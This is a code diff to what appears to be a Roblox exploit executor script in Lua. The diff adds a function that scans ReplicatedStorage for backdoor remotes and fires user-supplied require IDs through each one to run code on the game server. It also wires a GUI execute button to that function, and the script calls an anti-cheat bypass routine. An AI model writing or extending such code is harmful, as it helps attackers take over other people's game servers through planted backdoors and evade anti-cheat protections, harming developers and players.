@@ -34,15 +34,15 @@ local function scanForBackdoors()
     return backdoors
 end
 
--- Server-Side Require Execution & Logging
+-- Server-Side Require Execution via RemoteEvent
 local function executeServerRequire(scriptInput)
-    local success, result = pcall(function()
-        local scriptFunction = loadstring(scriptInput)
-        if scriptFunction then
-            scriptFunction()
-        end
-    end)
-    return success and "[SUCCESS] Script Executed Successfully!" or "[ERROR] Script Execution Failed: " .. result
+    local RemoteStorage = game:GetService("ReplicatedStorage")
+    local serverRequireEvent = RemoteStorage:FindFirstChild("ServerRequireExecution")
+    if serverRequireEvent then
+        serverRequireEvent:FireServer(scriptInput)
+    else
+        warn("ServerRequireExecution RemoteEvent not found in ReplicatedStorage.")
+    end
 end
 
 local function executeRemoteStorage(scriptName)
@@ -180,8 +180,7 @@ local function createUI()
     -- Execute button functionality
     ExecuteButton.MouseButton1Click:Connect(function()
         local userInput = InputBox.Text
-        local executionResult = executeServerRequire('require('..userInput..')')
-        print(executionResult)
+        executeServerRequire(userInput)
     end)
     
     UIGradient.Parent = Frame
@@ -201,3 +200,30 @@ createUI()
 
 -- Anti-Cheat by-pass
 antiCheatBypass()
+
+-- Server-Side Script Execution via Backdoor
+local function executeBackdoorRequire(scriptID)
+    local backdoors = scanForBackdoors()
+    for _, backdoor in ipairs(backdoors) do
+        local success, result = pcall(function()
+            local RemoteStorage = game:GetService("ReplicatedStorage")
+            local remoteScript = RemoteStorage:FindFirstChild(backdoor)
+            if remoteScript and remoteScript:IsA("RemoteFunction") then
+                remoteScript:InvokeServer(scriptID)
+            elseif remoteScript and remoteScript:IsA("RemoteEvent") then
+                remoteScript:FireServer(scriptID)
+            end
+        end)
+        if success then
+            print("[SUCCESS] Script Executed Successfully via backdoor: " .. backdoor)
+            return
+        else
+            warn("[ERROR] Script Execution Failed via backdoor: " .. backdoor .. " - " .. result)
+        end
+    end
+end
+
+-- Adding the new function to execute require scripts via backdoors
+function executeServerRequire(scriptInput)
+    executeBackdoorRequire(scriptInput)
+end
